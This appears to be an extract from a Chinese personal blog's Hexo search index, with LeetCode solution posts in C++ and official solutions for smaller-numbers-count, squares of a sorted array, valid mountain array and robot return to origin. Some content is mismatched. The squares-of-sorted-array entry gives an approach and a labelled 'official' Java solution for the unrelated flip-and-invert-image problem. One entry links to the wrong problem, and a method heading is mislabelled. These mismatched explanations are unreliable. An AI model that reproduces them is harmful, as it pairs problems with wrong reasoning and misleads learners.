<p><strong>c++代码：</strong>（执行16ms，击败56.92%，内存10.7M，击败7.63%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">smallerNumbersThanCurrent</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; ret;</span><br><span class="line">        <span class="keyword">int</span> n = nums.size();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[j] &lt; nums[i]) &#123;</span><br><span class="line">                    cnt++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ret.push_back(cnt);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(N^2)$，其中 $N$ 为数组的长度。</li>
<li>空间复杂度：$O(1)$。注意我们不计算答案数组的空间占用。</li>
</ul>
<p><strong>方法二：快速排序</strong><br>我们也可以将数组排序，并记录每一个数在原数组中的位置。对于排序后的数组中的每一个数，我们找出其左侧第一个小于它的数，这样就能够知道数组中小于该数的数量。</p>
<p><strong>c++代码：</strong>（执行32ms，击败36.78%，内存10.7M，击败7.90%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">smallerNumbersThanCurrent</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">pair</span>&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;&gt; data;</span><br><span class="line">        <span class="keyword">int</span> n = nums.size();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            data.emplace_back(nums[i], i);</span><br><span class="line">        &#125;</span><br><span class="line">        sort(data.begin(), data.end());</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">ret</span><span class="params">(n, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">int</span> prev = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (prev == <span class="number">-1</span> || data[i].first != data[i - <span class="number">1</span>].first) &#123;</span><br><span class="line">                prev = i;</span><br><span class="line">            &#125;</span><br><span class="line">            ret[data[i].second] = prev;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>复杂度分析</p>
<p>时间复杂度：$O(Nlog N)$，其中 $N$ 为数组的长度。排序需要 $O(Nlog N)$的时间，随后需要 $O(N)$ 时间来遍历。</p>
<p>空间复杂度：$O(N)$。因为要额外开辟一个数组。</p>
<p><strong>方法三：计数排序</strong><br>注意到数组元素的值域为 [0,100]，所以可以考虑建立一个频次数组 $cnt$ ，$cnt[i]$ 表示数字 $i$ 出现的次数。那么对于数字 $i$i而言，小于它的数目就为 $cnt[0…i-1]$ 的总和。</p>
<p><strong>c++代码：</strong>（执行12ms，击败73.62%，内存10.3M，击败39.54%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">smallerNumbersThanCurrent</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">cnt</span><span class="params">(<span class="number">101</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">int</span> n = nums.size();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            cnt[nums[i]]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">100</span>; i++) &#123;</span><br><span class="line">            cnt[i] += cnt[i - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; ret;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            ret.push_back(nums[i] == <span class="number">0</span> ? <span class="number">0</span>: cnt[nums[i]<span class="number">-1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<p>时间复杂度：$O(N + K)$，其中 $K$为值域大小。需要遍历两次原数组，同时遍历一次频次数组 $cnt$ 找出前缀和。</p>
<p>空间复杂度：$O(K)$。因为要额外开辟一个值域大小的数组。</p>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>还是最直观的暴力方法最好想，官方题解有多种做法。提交后的执行用时波动也挺大的。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>有序数组的平方</title>
    <url>/2020/11/16/%E6%9C%89%E5%BA%8F%E6%95%B0%E7%BB%84%E7%9A%84%E5%B9%B3%E6%96%B9/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/squares-of-a-sorted-array/submissions/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给定一个按非递减顺序排序的整数数组 <code>A</code>，返回每个数字的平方组成的新数组，要求也按非递减顺序排序。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[-4,-1,0,3,10]</span><br><span class="line">输出：[0,1,9,16,100]</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[-7,-3,2,3,11]</span><br><span class="line">输出：[4,9,9,49,121]</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ol>
<li><code>1 &lt;= A.length &lt;= 10000</code></li>
<li><code>-10000 &lt;= A[i] &lt;= 10000</code></li>
<li><code>A</code> 已按非递减顺序排序。</li>
</ol>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>遍历每一行，然后对每一行中的元素翻转交换元素的值（swap函数），再反转元素的值，注意特殊情况，矩阵行数为奇数时中间元素要特殊处理反转一次。</p>
<p><strong>c++代码：</strong>(执行用时136ms，击败27.35%，内存消耗24.9M，击败41.18%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">sortedSquares</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;A.size();++i)&#123;</span><br><span class="line">            A[i]=<span class="built_in">pow</span>(A[i],<span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//对新数组非递减排序</span></span><br><span class="line">        sort(A.begin(),A.end());</span><br><span class="line">        <span class="keyword">return</span> A;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/squares-of-a-sorted-array/solution/you-xu-shu-zu-de-ping-fang-by-leetcode-solution/">官方题解</a>:</h6><p><strong>方法一： 模拟</strong></p>
<p>我们可以不使用额外的（非常数）空间来完成翻转和反转操作。对于 <code>A[i][j]​</code>，我们将它和 <code>A[i][c - j - 1]​</code> 进行交换（即翻转），其中 <code>c</code> 是数组 <code>A</code> 的列数。在交换的同时，我们可以将这两个数进行反转。</p>
<p><strong>Java代码：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[][] flipAndInvertImage(<span class="keyword">int</span>[][] A) &#123;</span><br><span class="line">        <span class="keyword">int</span> C = A[<span class="number">0</span>].length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span>[] row: A)</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; (C + <span class="number">1</span>) / <span class="number">2</span>; ++i) &#123;</span><br><span class="line">                <span class="keyword">int</span> tmp = row[i] ^ <span class="number">1</span>;</span><br><span class="line">                row[i] = row[C - <span class="number">1</span> - i] ^ <span class="number">1</span>;</span><br><span class="line">                row[C - <span class="number">1</span> - i] = tmp;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">return</span> A;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(M*N)$，其中 $M$ 和 $N$ 分别为数组 <code>A</code> 的行数和列数。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解和我的思路一样，不过对于特殊情况比我处理的好，也不算特殊情况吧，只是我自己把它当作特殊情况处理了，主要在于我使用了vector容器中的swap成员函数来交换两个元素，这样必须反转后覆盖原值，对于奇数行数矩阵的每行中间元素反转了两次，而采用tmp辅助变量来进行交换两个元素值不涉及到覆盖问题。其实就是太执着于STL模板库中的成员函数了，自己实现交换元素的功能也挺好，相当于对源码根据实际情况进行了改进，这样才能更灵活地处理问题。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>有效的山脉数组</title>
    <url>/2020/11/03/%E6%9C%89%E6%95%88%E7%9A%84%E5%B1%B1%E8%84%89%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/intersection-of-two-arrays/">题目地址</a></strong></p>
<p><strong>题目名称：</strong>有效的山脉数组</p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h6><p>给定一个数组<code>A</code>，如果它是有效的山脉数组就返回<code>true</code>，否则返回<code>false</code>。</p>
<p>让我们回顾一下，如果<code>A</code>满足下述条件，那么它是一个山脉数组：</p>
<ul>
<li><p><code>A.length &gt;= 3</code></p>
</li>
<li><p>在 <code>0 &lt; i &lt; A.length - 1</code> 条件下，存在 i 使得：</p>
<ul>
<li><code>A[0] &lt; A[1] &lt; ... A[i-1] &lt; A[i]</code></li>
</ul>
</li>
<li><code>A[i] &gt; A[i+1] &gt; ... &gt; A[A.length - 1]</code></li>
</ul>
<a id="more"></a>
<p><img src="/2020/11/03/%E6%9C%89%E6%95%88%E7%9A%84%E5%B1%B1%E8%84%89%E6%95%B0%E7%BB%84/hint_valid_mountain_array.png" alt="img"></p>
<p><strong>示例1：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">输入：[<span class="number">2</span>,<span class="number">1</span>]</span><br><span class="line">输出：<span class="literal">false</span></span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">输入：[<span class="number">3</span>,<span class="number">5</span>,<span class="number">5</span>]</span><br><span class="line">输出：<span class="literal">false</span></span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">输入：[<span class="number">0</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>]</span><br><span class="line">输出：<span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ol>
<li><code>0 &lt;= A.length &lt;= 10000</code></li>
<li><code>0 &lt;= A[i] &lt;= 10000</code></li>
</ol>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>可以两次for循环每次循环到中间最大值，第一次从前往后遍历升序判断，第二次从后往前遍历升序判断。</p>
<p><strong>c++代码：</strong>(执行用时56ms，击败90.92%，内存消耗21.2M，击败5.27%)</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">validMountainArray</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">bool</span> result = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(A.size()&lt;<span class="number">3</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; A.size() - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">            <span class="comment">//前半部分结束</span></span><br><span class="line">            <span class="keyword">if</span>(A[i] &gt;= A[i + <span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="keyword">if</span>(i == <span class="number">0</span>) &#123;</span><br><span class="line">                    result = <span class="literal">false</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">//前半部分满足</span></span><br><span class="line">                    result = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//判断后半部分</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = i; j &lt; A.size() - <span class="number">1</span>; ++j) &#123;</span><br><span class="line">            <span class="comment">//不是山脉数组</span></span><br><span class="line">            <span class="keyword">if</span>(A[j] &lt;= A[j + <span class="number">1</span>]) &#123;</span><br><span class="line">                result = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解："><a href="#官方题解：" class="headerlink" title="官方题解："></a><a href="https://leetcode-cn.com/problems/valid-mountain-array/solution/you-xiao-de-shan-mai-shu-zu-by-leetcode-solution/">官方题解：</a></h6><p><strong>方法一：线性扫描</strong></p>
<p>按题意模拟即可。我们从数组的最左侧开始向右扫描，直到找到第一个不满足 $A[i] &lt; A[i + 1]$ 的下标$i$，那么 $i$ 就是这个数组的最高点的下标。如果 $i = 0$ 或者不存在这样的 $i$（即整个数组都是单调递增的），那么就返回 $false$。否则从 $i$ 开始继续向右扫描，判断接下来的的下标 $j$ 是否都满足 $A[j] &gt; A[j + 1]$，若都满足就返回 $true$，否则返回 $false$。</p>
<p><strong>代码</strong>（执行用时60ms，击败81.85%，内存21.1M，击败5.27%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">validMountainArray</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> N = A.size();</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 递增扫描</span></span><br><span class="line">        <span class="keyword">while</span> (i + <span class="number">1</span> &lt; N &amp;&amp; A[i] &lt; A[i + <span class="number">1</span>]) &#123;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 最高点不能是数组的第一个位置或最后一个位置</span></span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">0</span> || i == N - <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 递减扫描</span></span><br><span class="line">        <span class="keyword">while</span> (i + <span class="number">1</span> &lt; N &amp;&amp; A[i] &gt; A[i + <span class="number">1</span>]) &#123;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> i == N - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><strong>时间复杂度：</strong>$O(N)$，其中 $N$ 是数组 $A$ 的长度。</li>
<li><strong>空间复杂度：</strong>$O(1)$。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>我的解题思路和官方题解是一样的，只不过官方题解代码可能更简洁清楚一些。感觉官方题解挺好的啊，为什么效率还没我的高呢😅</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>机器人能否返回原点</title>
    <url>/2020/11/13/%E6%9C%BA%E5%99%A8%E4%BA%BA%E8%83%BD%E5%90%A6%E8%BF%94%E5%9B%9E%E5%8E%9F%E7%82%B9/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/robot-return-to-origin/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>在二维平面上，有一个机器人从原点 (0, 0) 开始。给出它的移动顺序，判断这个机器人在完成移动后是否在 (0, 0) 处结束。</p>
<p>移动顺序由字符串表示。字符 move[i] 表示其第 i 次移动。机器人的有效动作有 <code>R</code>（右），<code>L</code>（左），<code>U</code>（上）和 <code>D</code>（下）。如果机器人在完成所有动作后返回原点，则返回 true。否则，返回 false。</p>
<p>注意：机器人“面朝”的方向无关紧要。 “R” 将始终使机器人向右移动一次，“L” 将始终向左移动等。此外，假设每次移动机器人的移动幅度相同。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;UD&quot;</span><br><span class="line">输出: true</span><br><span class="line">解释：机器人向上移动一次，然后向下移动一次。所有动作都具有相同的幅度，因此它最终回到它开始的原点。因此，我们返回 true。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;LL&quot;</span><br><span class="line">输出: false</span><br><span class="line">解释：机器人向左移动两次。它最终位于原点的左侧，距原点有两次 “移动” 的距离。我们返回 false，因为它在移动结束时没有返回原点。</span><br></pre></td></tr></table></figure>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>直接模拟就好了，用(x,y)坐标表示，遍历字符串，如果是R字符则x加1，U表示y加1，最后判断x和y是否是0就可以了。</p>
<p><strong>c++代码：</strong>(执行用时16ms，击败82.98%，内存消耗8.1M，击败16.74%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">judgeCircle</span><span class="params">(<span class="built_in">string</span> moves)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> x=<span class="number">0</span>,y=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;moves.length();++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(moves[i]==<span class="string">&#x27;R&#x27;</span>)&#123;</span><br><span class="line">                ++x;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(moves[i]==<span class="string">&#x27;L&#x27;</span>)&#123;</span><br><span class="line">                --x;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(moves[i]==<span class="string">&#x27;U&#x27;</span>)&#123;</span><br><span class="line">                ++y;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(moves[i]==<span class="string">&#x27;D&#x27;</span>)&#123;</span><br><span class="line">                --y;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(x==<span class="number">0</span> &amp;&amp; y==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/robot-return-to-origin/solution/ji-qi-ren-neng-fou-fan-hui-yuan-dian-by-leetcode-s/">官方题解</a>:</h6><p><strong>方法一： 模拟</strong></p>
<p><strong>思路与算法</strong></p>
<p>我们只需按指令模拟机器人移动的坐标即可。起始时机器人的坐标为 $(0,0)$，在遍历完所有指令并对机器人进行移动之后，判断机器人的坐标是否为 $(0,0)$ 即可。</p>
<p>具体来说，我们用两个变量 xx 和 yy 来表示机器人当前所在的坐标为 $(x,y)$，起始时 $x=0$，$y=0$。接下来我们遍历指令并更新机器人的坐标：</p>
<p>如果指令是 $U$，则令 $y=y-1$<br>如果指令是 $D$，则令 $y=y+1$<br>如果指令是 $L$，则令 $x=x-1$<br>如果指令是 $R$，则令 $x=x+1$<br>最后判断 $(x,y)$ 是否为 $(0,0)$即可。</p>
<p><strong>c++代码：</strong>(执行用时12ms，击败97.42%，内存消耗8.3M，击败5.04%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">judgeCircle</span><span class="params">(<span class="built_in">string</span> moves)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> x = <span class="number">0</span>, y = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span>&amp; move: moves) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move == <span class="string">&#x27;U&#x27;</span>) &#123;</span><br><span class="line">                y--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (move == <span class="string">&#x27;D&#x27;</span>) &#123;</span><br><span class="line">                y++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (move == <span class="string">&#x27;L&#x27;</span>) &#123;</span><br><span class="line">                x--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (move == <span class="string">&#x27;R&#x27;</span>) &#123;</span><br><span class="line">                x++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> x == <span class="number">0</span> &amp;&amp; y == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度： $O(N)$，其中 $N$ 表示 $\textit{moves}$ 指令串的长度。我们只需要遍历一遍字符串即可。</p>
</li>
<li><p>空间复杂度： $O(1)$。我们只需要常数的空间来存放若干变量。</p>
</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解和我的思路一样，不过有值得学习的地方。第一点可以改用增强for循环，第二点return返回时使用逻辑表达式，不像我用了if判断😆，题目还比较简单。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
